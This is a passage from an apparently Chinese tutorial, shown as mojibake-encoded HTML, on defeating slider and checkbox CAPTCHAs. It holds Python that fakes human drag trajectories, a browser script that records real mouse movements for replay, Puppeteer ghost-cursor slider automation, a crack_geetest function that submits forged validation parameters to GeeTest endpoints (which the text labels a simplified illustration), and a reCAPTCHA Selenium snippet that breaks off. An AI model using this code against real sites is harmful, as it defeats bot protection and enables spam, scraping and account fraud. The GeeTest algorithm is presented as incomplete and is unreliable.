        <span class="c1"># æ·»åŠ yè½´æŠ–åŠ¨</span>
        <span class="n">y</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
        <span class="n">trajectory</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">current</span><span class="p">),</span> <span class="n">y</span><span class="p">,</span> <span class="n">t</span><span class="p">))</span>

    <span class="c1"># ç¬¬äºŒé˜¶æ®µï¼šåŒ€é€Ÿé˜¶æ®µ (40%)</span>
    <span class="k">while</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">overshoot_distance</span> <span class="o">*</span> <span class="mf">0.7</span><span class="p">:</span>
        <span class="n">t</span> <span class="o">+=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
        <span class="n">move</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
        <span class="n">current</span> <span class="o">+=</span> <span class="n">move</span>
        <span class="n">y</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
        <span class="n">trajectory</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">current</span><span class="p">),</span> <span class="n">y</span><span class="p">,</span> <span class="n">t</span><span class="p">))</span>

    <span class="c1"># ç¬¬ä¸‰é˜¶æ®µï¼šå‡é€Ÿé˜¶æ®µ (30%)</span>
    <span class="n">start_decel</span> <span class="o">=</span> <span class="n">current</span>
    <span class="k">while</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">overshoot_distance</span><span class="p">:</span>
        <span class="n">t</span> <span class="o">+=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>
        <span class="n">ratio</span> <span class="o">=</span> <span class="p">(</span><span class="n">current</span> <span class="o">-</span> <span class="n">start_decel</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="n">overshoot_distance</span> <span class="o">-</span> <span class="n">start_decel</span><span class="p">)</span>
        <span class="n">move</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">ease_out_quad</span><span class="p">(</span><span class="n">ratio</span><span class="p">))</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">current</span> <span class="o">+=</span> <span class="n">move</span>
        <span class="n">y</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
        <span class="n">trajectory</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">current</span><span class="p">),</span> <span class="n">y</span><span class="p">,</span> <span class="n">t</span><span class="p">))</span>

    <span class="c1"># å¦‚æœæœ‰è¿‡å†²ï¼Œæ·»åŠ å›é€€é˜¶æ®µ</span>
    <span class="k">if</span> <span class="n">overshoot</span><span class="p">:</span>
        <span class="n">back_to</span> <span class="o">=</span> <span class="n">distance</span>
        <span class="k">while</span> <span class="n">current</span> <span class="o">&gt;</span> <span class="n">back_to</span><span class="p">:</span>
            <span class="n">t</span> <span class="o">+=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
            <span class="n">move</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
            <span class="n">current</span> <span class="o">-=</span> <span class="n">move</span>
            <span class="n">y</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
            <span class="n">trajectory</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">current</span><span class="p">),</span> <span class="n">y</span><span class="p">,</span> <span class="n">t</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">trajectory</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">trajectory</span> <span class="o">=</span> <span class="n">generate_trajectory</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="n">overshoot</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ç”Ÿæˆäº† </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">trajectory</span><span class="p">)</span><span class="si">}</span><span class="s2"> ä¸ªè½¨è¿¹ç‚¹&quot;</span><span class="p">)</span>
<span class="c1"># è¾“å‡º: [(3, 1, 15), (7, -1, 28), (12, 0, 43), ...]</span>
</code></pre>
      </div>

      <hr />

      <h3 id="22-çœŸå®è½¨è¿¹é‡‡é›†ä¸é‡æ”¾">2.2 çœŸå®è½¨è¿¹é‡‡é›†ä¸é‡æ”¾</h3>

      <p><strong>æ€è·¯</strong>: è®°å½•çœŸäººæ»‘åŠ¨çš„è½¨è¿¹ï¼Œå»ºç«‹è½¨è¿¹åº“ï¼Œæ¯æ¬¡éšæœºé€‰æ‹©ä¸€æ¡å¹¶ç¼©æ”¾</p>

      <p><strong>é‡‡é›†è„šæœ¬</strong> (åœ¨æµè§ˆå™¨ Console ä¸­è¿è¡Œ):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">trajectory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">startTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>

<span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;mousedown&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">className</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;slider&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">startTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<span class="w">        </span><span class="nx">trajectory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;mousemove&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">recordMove</span><span class="p">);</span>
<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;mouseup&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">endRecording</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">recordMove</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">startTime</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">trajectory</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
<span class="w">            </span><span class="nx">x</span><span class="o">:</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">clientX</span><span class="p">,</span>
<span class="w">            </span><span class="nx">y</span><span class="o">:</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">clientY</span><span class="p">,</span>
<span class="w">            </span><span class="nx">t</span><span class="o">:</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">startTime</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">endRecording</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">trajectory</span><span class="p">));</span>
<span class="w">    </span><span class="nx">copy</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">trajectory</span><span class="p">));</span><span class="w">  </span><span class="c1">// è‡ªåŠ¨å¤åˆ¶åˆ°å‰ªè´´æ¿</span>

<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">removeEventListener</span><span class="p">(</span><span class="s1">&#39;mousemove&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">recordMove</span><span class="p">);</span>
<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">removeEventListener</span><span class="p">(</span><span class="s1">&#39;mouseup&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">endRecording</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>é‡æ”¾ä¸ç¼©æ”¾</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">def</span><span class="w"> </span><span class="nf">scale_trajectory</span><span class="p">(</span><span class="n">original_trajectory</span><span class="p">,</span> <span class="n">target_distance</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    ç¼©æ”¾è½¨è¿¹ä»¥é€‚åº”æ–°çš„è·ç¦»</span>

<span class="sd">    :param original_trajectory: åŸå§‹è½¨è¿¹ [{&#39;x&#39;: 100, &#39;y&#39;: 0, &#39;t&#39;: 150}, ...]</span>
<span class="sd">    :param target_distance: ç›®æ ‡è·ç¦»</span>
<span class="sd">    :return: ç¼©æ”¾åçš„è½¨è¿¹</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="c1"># è®¡ç®—åŸå§‹è·ç¦»</span>
    <span class="n">original_distance</span> <span class="o">=</span> <span class="n">original_trajectory</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="s1">&#39;x&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">original_trajectory</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;x&#39;</span><span class="p">]</span>

    <span class="c1"># è®¡ç®—ç¼©æ”¾æ¯”ä¾‹</span>
    <span class="n">scale</span> <span class="o">=</span> <span class="n">target_distance</span> <span class="o">/</span> <span class="n">original_distance</span>

    <span class="c1"># ç¼©æ”¾è½¨è¿¹</span>
    <span class="n">scaled_trajectory</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">base_x</span> <span class="o">=</span> <span class="n">original_trajectory</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;x&#39;</span><span class="p">]</span>

    <span class="k">for</span> <span class="n">point</span> <span class="ow">in</span> <span class="n">original_trajectory</span><span class="p">:</span>
        <span class="n">scaled_x</span> <span class="o">=</span> <span class="p">(</span><span class="n">point</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">base_x</span><span class="p">)</span> <span class="o">*</span> <span class="n">scale</span>
        <span class="n">scaled_trajectory</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
            <span class="s1">&#39;x&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">scaled_x</span><span class="p">),</span>
            <span class="s1">&#39;y&#39;</span><span class="p">:</span> <span class="n">point</span><span class="p">[</span><span class="s1">&#39;y&#39;</span><span class="p">],</span>
            <span class="s1">&#39;t&#39;</span><span class="p">:</span> <span class="n">point</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">]</span>
        <span class="p">})</span>

    <span class="k">return</span> <span class="n">scaled_trajectory</span>

<span class="c1"># åŠ è½½è½¨è¿¹åº“</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;trajectories.json&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">trajectory_library</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>

<span class="c1"># éšæœºé€‰æ‹©ä¸€æ¡è½¨è¿¹</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="n">trajectory</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">trajectory_library</span><span class="p">)</span>

<span class="c1"># ç¼©æ”¾åˆ°ç›®æ ‡è·ç¦»</span>
<span class="n">scaled_trajectory</span> <span class="o">=</span> <span class="n">scale_trajectory</span><span class="p">(</span><span class="n">trajectory</span><span class="p">,</span> <span class="n">gap_x</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h3 id="23-puppeteer-ghost-cursor-æ’ä»¶">2.3 Puppeteer ghost-cursor æ’ä»¶</h3>

      <p><strong>å®‰è£…</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>ghost-cursor
</code></pre>
      </div>

      <p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">createCursor</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;ghost-cursor&#39;</span><span class="p">);</span>

<span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span><span class="w"> </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">});</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">cursor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">createCursor</span><span class="p">(</span><span class="nx">page</span><span class="p">);</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com/captcha&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æ‰¾åˆ°æ»‘å—å…ƒç´ </span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">slider</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.slider-button&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">sliderBox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">slider</span><span class="p">.</span><span class="nx">boundingBox</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// è®¡ç®—ç›®æ ‡ä½ç½®ï¼ˆå‡è®¾ç¼ºå£åœ¨ 200px å¤„ï¼‰</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">targetX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sliderBox</span><span class="p">.</span><span class="nx">x</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">200</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">targetY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sliderBox</span><span class="p">.</span><span class="nx">y</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">sliderBox</span><span class="p">.</span><span class="nx">height</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// ä½¿ç”¨ ghost-cursor ç§»åŠ¨é¼ æ ‡ï¼ˆè‡ªåŠ¨ç”Ÿæˆé€¼çœŸè½¨è¿¹ï¼‰</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">cursor</span><span class="p">.</span><span class="nx">move</span><span class="p">(</span><span class="nx">sliderBox</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="nx">sliderBox</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">cursor</span><span class="p">.</span><span class="nx">click</span><span class="p">();</span><span class="w">  </span><span class="c1">// æŒ‰ä¸‹é¼ æ ‡</span>

<span class="w">    </span><span class="c1">// ç§»åŠ¨åˆ°ç›®æ ‡ä½ç½®ï¼ˆåŒ…å«éšæœºæŠ–åŠ¨å’Œæ›²çº¿ï¼‰</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">cursor</span><span class="p">.</span><span class="nx">move</span><span class="p">(</span><span class="nx">targetX</span><span class="p">,</span><span class="w"> </span><span class="nx">targetY</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">waitForSelector</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">        </span><span class="nx">paddingPercentage</span><span class="o">:</span><span class="w"> </span><span class="mf">10</span><span class="p">,</span><span class="w">  </span><span class="c1">// 10% çš„éšæœºåç§»</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">mouse</span><span class="p">.</span><span class="nx">up</span><span class="p">();</span><span class="w">  </span><span class="c1">// é‡Šæ”¾é¼ æ ‡</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="3-åè®®ç ´è§£-protocol-reverse">3. åè®®ç ´è§£ (Protocol Reverse)</h2>

      <p>æœ‰äº›éªŒè¯ç ä¸éœ€è¦æ¨¡æ‹Ÿè½¨è¿¹ï¼Œç›´æ¥ç ´è§£å…¶åŠ å¯†å‚æ•°å³å¯ã€‚</p>

      <h3 id="31-æéªŒ-geetest-åè®®åˆ†æ">3.1 æéªŒ (GeeTest) åè®®åˆ†æ</h3>

      <p><strong>æµç¨‹</strong>:</p>

      <ol>
        <li>åˆå§‹åŒ–ï¼š<code>GET /api/captcha/init</code></li>
        <li>è·å–å›¾ç‰‡ï¼š<code>GET /captcha/bg/{challenge}.jpg</code></li>
        <li>éªŒè¯ï¼š<code>POST /api/captcha/verify</code></li>
      </ol>

      <p><strong>éªŒè¯å‚æ•°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="s2">&quot;challenge&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;abc123...&quot;</span><span class="p">,</span><span class="w">  </span><span class="c1">// æŒ‘æˆ˜ç </span>
<span class="w">    </span><span class="s2">&quot;validate&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;def456...&quot;</span><span class="p">,</span><span class="w">   </span><span class="c1">// åŠ å¯†åçš„è½¨è¿¹</span>
<span class="w">    </span><span class="s2">&quot;seccode&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;validate|jordan&quot;</span><span class="w">  </span><span class="c1">// validate + &quot;|jordan&quot;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>validate ç”Ÿæˆé€»è¾‘</strong> (ç®€åŒ–ç‰ˆ):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æéªŒåŠ å¯†ç®—æ³•ï¼ˆå·²å…¬å¼€éƒ¨åˆ†ï¼‰</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">get_validate</span><span class="p">(</span><span class="nx">trajectory</span><span class="p">,</span><span class="w"> </span><span class="nx">challenge</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// 1. ç¼–ç è½¨è¿¹</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">encoded_trajectory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encode_trajectory</span><span class="p">(</span><span class="nx">trajectory</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// 2. ä¸ challenge è¿›è¡Œè¿ç®—</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">combined</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encoded_trajectory</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">challenge</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// 3. MD5 + Base64</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">validate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">combined</span><span class="p">).</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">32</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">validate</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">encode_trajectory</span><span class="p">(</span><span class="nx">trajectory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// è½¨è¿¹ç¼–ç ï¼ˆå®é™…æ›´å¤æ‚ï¼ŒåŒ…å«åŠ å¯†å’Œå‹ç¼©ï¼‰</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">encoded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">point</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">trajectory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">encoded</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">int_to_char</span><span class="p">(</span><span class="nx">point</span><span class="p">.</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">int_to_char</span><span class="p">(</span><span class="nx">point</span><span class="p">.</span><span class="nx">y</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">int_to_char</span><span class="p">(</span><span class="nx">point</span><span class="p">.</span><span class="nx">t</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">encoded</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>Python ç ´è§£ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>

<span class="k">def</span><span class="w"> </span><span class="nf">crack_geetest</span><span class="p">(</span><span class="n">gap_x</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ç ´è§£æéªŒæ»‘å—éªŒè¯&quot;&quot;&quot;</span>

    <span class="c1"># 1. åˆå§‹åŒ–è·å– challenge</span>
    <span class="n">init_url</span> <span class="o">=</span> <span class="s2">&quot;https://api.geetest.com/get.php&quot;</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">init_url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">&#39;gt&#39;</span><span class="p">:</span> <span class="s1">&#39;your_gt_key&#39;</span><span class="p">,</span>
        <span class="s1">&#39;t&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span>
    <span class="p">})</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
    <span class="n">challenge</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;challenge&#39;</span><span class="p">]</span>

    <span class="c1"># 2. ç”Ÿæˆè½¨è¿¹</span>
    <span class="n">trajectory</span> <span class="o">=</span> <span class="n">generate_trajectory</span><span class="p">(</span><span class="n">gap_x</span><span class="p">)</span>

    <span class="c1"># 3. è®¡ç®— validate (ç®€åŒ–ç‰ˆï¼Œå®é™…éœ€è¦é€†å‘å®Œæ•´ç®—æ³•)</span>
    <span class="n">validate</span> <span class="o">=</span> <span class="n">calculate_validate</span><span class="p">(</span><span class="n">trajectory</span><span class="p">,</span> <span class="n">challenge</span><span class="p">)</span>

    <span class="c1"># 4. æäº¤éªŒè¯</span>
    <span class="n">verify_url</span> <span class="o">=</span> <span class="s2">&quot;https://api.geetest.com/ajax.php&quot;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">verify_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">&#39;gt&#39;</span><span class="p">:</span> <span class="s1">&#39;your_gt_key&#39;</span><span class="p">,</span>
        <span class="s1">&#39;challenge&#39;</span><span class="p">:</span> <span class="n">challenge</span><span class="p">,</span>
        <span class="s1">&#39;validate&#39;</span><span class="p">:</span> <span class="n">validate</span><span class="p">,</span>
        <span class="s1">&#39;seccode&#39;</span><span class="p">:</span> <span class="n">validate</span> <span class="o">+</span> <span class="s1">&#39;|jordan&#39;</span>
    <span class="p">})</span>

    <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</code></pre>
      </div>

      <p><strong>æ³¨æ„</strong>: çœŸå®çš„æéªŒç®—æ³•éå¸¸å¤æ‚ï¼ŒåŒ…å«å¤šé‡åŠ å¯†ã€æ··æ·†å’ŒæœåŠ¡å™¨ç«¯éªŒè¯ã€‚ä¸Šè¿°ä»£ç ä»…ä¸ºç¤ºæ„ã€‚</p>

      <hr />

      <h3 id="32-recaptcha-ä»¤ç‰Œè·å–">3.2 reCAPTCHA ä»¤ç‰Œè·å–</h3>

      <p><strong>Google reCAPTCHA v2</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://www.google.com/recaptcha/api2/demo&#39;</span><span class="p">)</span>

<span class="c1"># æ‰¾åˆ° reCAPTCHA iframe</span>
<span class="n">iframe</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element_by_css_selector</span><span class="p">(</span><span class="s1">&#39;iframe[src*=&quot;recaptcha&quot;]&#39;</span><span class="p">)</span>
<span class="n">driver</span><span class="o">.</span><span class="n">switch_to</span><span class="o">.</span><span class="n">frame</span><span class="p">(</span><span class="n">iframe</span><span class="p">)</span>

<span class="c1"># ç‚¹å‡»å¤é€‰æ¡†</span>
<span class="n">checkbox</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s1">&#39;recaptcha-anchor&#39;</span><span class="p">)</span>
<span class="n">checkbox</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>

<span class="c1"># ç­‰å¾…éªŒè¯å®Œæˆ</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

